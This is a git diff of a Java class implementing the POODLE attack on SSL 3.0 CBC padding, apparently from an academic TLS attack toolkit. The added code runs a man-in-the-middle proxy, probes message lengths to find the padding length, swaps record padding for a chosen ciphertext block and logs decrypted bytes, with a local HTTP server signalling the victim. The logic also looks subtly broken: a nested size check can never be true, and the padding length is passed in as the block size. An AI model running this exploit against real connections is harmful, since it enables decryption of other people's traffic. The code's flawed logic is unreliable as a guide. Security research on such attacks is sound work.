@@ -12,6 +12,7 @@ package de.rub.nds.tlsbreaker.poodle.impl;
 import de.rub.nds.tlsbreaker.breakercommons.impl.Attacker;
 import de.rub.nds.tlsbreaker.poodle.config.PoodleCommandConfig;
 import de.rub.nds.tlsbreaker.poodle.util.MyHttpHandler;
+import de.rub.nds.tlsbreaker.poodle.util.PoodleHTTPServer;
 import de.rub.nds.tlsbreaker.poodle.util.PoodleUtils;
 import de.rub.nds.tlsattacker.core.config.Config;
 import de.rub.nds.tlsattacker.core.constants.CipherSuite;
@@ -41,6 +42,7 @@ import java.util.concurrent.Executors;
 import java.util.concurrent.ThreadPoolExecutor;
 import java.util.concurrent.TimeUnit;
 
+import com.beust.jcommander.internal.Console;
 import com.sun.net.httpserver.*;
 
 import org.apache.logging.log4j.LogManager;
@@ -55,7 +57,9 @@ public class PoodleAttacker extends Attacker<PoodleCommandConfig> {
 
     private static final Logger LOGGER = LogManager.getLogger();
 
-    private MyHttpHandler httphandler;
+    MyHttpHandler httphandler;
+    
+    int i = 0;
 
     /**
      *
@@ -65,26 +69,23 @@ public class PoodleAttacker extends Attacker<PoodleCommandConfig> {
     public PoodleAttacker(PoodleCommandConfig config, Config baseConfig) {
         super(config, baseConfig);
 
-        HttpServer server = null;
-        try {
-            server = HttpServer.create(new InetSocketAddress("localhost", 8001), 0);
-        } catch (IOException e1) {
-            // TODO Auto-generated catch block
-            e1.printStackTrace();
-        }
+        // Start the Server which will signal the client
         httphandler = new MyHttpHandler();
-        ThreadPoolExecutor threadPoolExecutor = (ThreadPoolExecutor) Executors.newFixedThreadPool(10);
-        server.createContext("/test", httphandler);
-        server.setExecutor(threadPoolExecutor);
-        server.start();
+        PoodleHTTPServer poodleHTTPServer = new PoodleHTTPServer(httphandler);
+        poodleHTTPServer.startPoddleHTTPServer();
+        CONSOLE.info(" Server started on port 8001");
     }
 
     @Override
     public void executeAttack() {
-        int i = 0;
+
+        int paddingLength = findPaddingLength();
+
+        System.out.println(paddingLength);
+
         while (true) {
             CONSOLE.info("ITERATION: " + i);
-            sendAModifiedMessage();
+            sendAModifiedMessage(paddingLength);
             i++;
         }
     }
@@ -93,13 +94,134 @@ public class PoodleAttacker extends Attacker<PoodleCommandConfig> {
     // mssage until the size changes
     public int findPaddingLength() {
 
-        return 0;
+        int paddingLength = 1;
+
+        int startingMessageLength = 0;
+
+        Config conf1 = config.createConfig();
+        conf1.setWorkflowTraceType(WorkflowTraceType.SIMPLE_FORWARDING_MITM_PROXY);
+        conf1.setDefaultRunningMode(RunningModeType.MITM);
+        conf1.setWorkflowExecutorShouldClose(false);
+
+        State state1 = new State(conf1);
+
+        WorkflowExecutor workflowExecutor1 = WorkflowExecutorFactory.createWorkflowExecutor(
+                WorkflowExecutorType.DEFAULT,
+                state1);
+        workflowExecutor1.executeWorkflow();
+
+        // state.getInboundTlsContexts().get(0).
+
+        ReceiveMessageHelper receiveMessageHelper1 = new ReceiveMessageHelper();
+
+        try {
+            MessageActionResult mar = receiveMessageHelper1.receiveMessages(state1.getInboundTlsContexts().get(0));
+
+            // If there are no upcoming messages, just wait.
+            if (mar.getMessageList().size() != 0) {
+
+                // sendMessageHelper.sendRecords(mar.getRecordList(),
+                // state.getOutboundTlsContexts().get(0));
+
+                if (mar.getMessageList().size() == 0) {
+
+                    CONSOLE.info("------->   Server sent no alert! Modified Message was accepted  <--------");
+
+                    CONSOLE.info("=====================DECRYPTING BYTE=====================================");
+
+                    // byte plain_padding_length = (byte) 7;
+
+                    // byte[] block_to_decrypt = Arrays.copyOfRange(modified_bytes, 13, 13 +
+                    // block_size);
+
+                } else {
+                    CONSOLE.info("The size of the message is:"
+                            + mar.getMessageList().get(0).getCompleteResultingMessage().getValue().length);
+
+                    startingMessageLength = mar.getMessageList().get(0).getCompleteResultingMessage().getValue().length;
+                }
+                state1.getInboundTlsContexts().get(0).getTransportHandler().closeConnection();
+                state1.getOutboundTlsContexts().get(0).getTransportHandler().closeConnection();
+
+            }
+
+        } catch (Exception e) {
+            System.out.println("No data yet");
+            e.printStackTrace();
+        }
+
+        boolean foundPaddingLength = false;
+
+        while (!foundPaddingLength) {
+
+            Config conf = config.createConfig();
+            conf.setWorkflowTraceType(WorkflowTraceType.SIMPLE_FORWARDING_MITM_PROXY);
+            conf.setDefaultRunningMode(RunningModeType.MITM);
+            conf.setWorkflowExecutorShouldClose(false);
+
+            State state = new State(conf);
+
+            WorkflowExecutor workflowExecutor = WorkflowExecutorFactory.createWorkflowExecutor(
+                    WorkflowExecutorType.DEFAULT,
+                    state);
+            workflowExecutor.executeWorkflow();
+
+            // state.getInboundTlsContexts().get(0).
+
+            ReceiveMessageHelper receiveMessageHelper = new ReceiveMessageHelper();
+
+            try {
+                MessageActionResult mar = receiveMessageHelper.receiveMessages(state.getInboundTlsContexts().get(0));
+
+                // If there are no upcoming messages, just wait.
+                if (mar.getMessageList().size() != 0) {
+
+                    // sendMessageHelper.sendRecords(mar.getRecordList(),
+                    // state.getOutboundTlsContexts().get(0));
+
+                    if (mar.getMessageList().size() == 0) {
+
+                        CONSOLE.info("------->   Server sent no alert! Modified Message was accepted  <--------");
+
+                        CONSOLE.info("=====================DECRYPTING BYTE=====================================");
+
+                        // byte plain_padding_length = (byte) 7;
+
+                        // byte[] block_to_decrypt = Arrays.copyOfRange(modified_bytes, 13, 13 +
+                        // block_size);
+
+                    } else {
+                        CONSOLE.info("The size of the message is:"
+                                + mar.getMessageList().get(0).getCompleteResultingMessage().getValue().length);
+
+                        if (mar.getMessageList().get(0).getCompleteResultingMessage()
+                                .getValue().length > startingMessageLength) {
+                            CONSOLE.info("Padding length is: " + paddingLength);
+                            CONSOLE.info("Message length found. Now starting with the main part of the attack!");
+                            foundPaddingLength = true;
+                        } else {
+                            paddingLength++;
+                        }
+                    }
+                    state.getInboundTlsContexts().get(0).getTransportHandler().closeConnection();
+                    state.getOutboundTlsContexts().get(0).getTransportHandler().closeConnection();
+
+                    if (foundPaddingLength) {
+                        httphandler.paddingfound = true;
+                        break;
+                    }
+                }
+
+            } catch (Exception e) {
+                System.out.println("No data yet");
+                e.printStackTrace();
+            }
+        }
+        return paddingLength;
     }
 
     // Second Part of the attack: Modify messages and send to server
-    public void sendAModifiedMessage() {
-
-        int block_size = 8;
+    public void sendAModifiedMessage(int block_size) {
 
         Config conf = config.createConfig();
         conf.setWorkflowTraceType(WorkflowTraceType.SIMPLE_FORWARDING_MITM_PROXY);
@@ -108,16 +230,14 @@ public class PoodleAttacker extends Attacker<PoodleCommandConfig> {
 
         State state = new State(conf);
 
-        WorkflowExecutor workflowExecutor =
-            WorkflowExecutorFactory.createWorkflowExecutor(WorkflowExecutorType.DEFAULT, state);
+        WorkflowExecutor workflowExecutor = WorkflowExecutorFactory.createWorkflowExecutor(WorkflowExecutorType.DEFAULT,
+                state);
         workflowExecutor.executeWorkflow();
 
         // state.getInboundTlsContexts().get(0).
 
         ReceiveMessageHelper receiveMessageHelper = new ReceiveMessageHelper();
         SendMessageHelper sendMessageHelper = new SendMessageHelper();
-
-        CONSOLE.info(" Server started on port 8001");
 
         try {
             // System.out.println(inboundHandler);
@@ -138,7 +258,7 @@ public class PoodleAttacker extends Attacker<PoodleCommandConfig> {
                 // Modify the byte, putt a block as padding, skip 5 first bytes plus the first
                 // block.
                 byte[] modified_bytes = poodleUtils
-                    .replacePaddingWithBlock(mar.getRecordList().get(1).getCompleteRecordBytes().getValue(), 8, 13);
+                        .replacePaddingWithBlock(mar.getRecordList().get(1).getCompleteRecordBytes().getValue(), 8, 13);
                 AbstractRecord modified_record = mar.getRecordList().get(1);
 
                 modified_record.setCompleteRecordBytes(modified_bytes);
@@ -174,7 +294,8 @@ public class PoodleAttacker extends Attacker<PoodleCommandConfig> {
                     byte[] block_before_message = Arrays.copyOfRange(modified_bytes, 5, 5 + block_size);
 
                     byte[] block_before_padding = Arrays.copyOfRange(modified_bytes,
-                        modified_bytes.length - 2 * block_size, (modified_bytes.length - 2 * block_size) + block_size);
+                            modified_bytes.length - 2 * block_size,
+                            (modified_bytes.length - 2 * block_size) + block_size);
 
                     // System.out.println(Hex.encodeHexString(block_to_decrypt));
 
@@ -184,7 +305,8 @@ public class PoodleAttacker extends Attacker<PoodleCommandConfig> {
 
                     CONSOLE.info("Decrypted byte is: " + new String(decrypted_string));
 
-                    httphandler.decrypted = true;
+                    httphandler.bytedecrypted = true;
+                    i = 0;
 
                     CONSOLE.info("========================================================================");
 
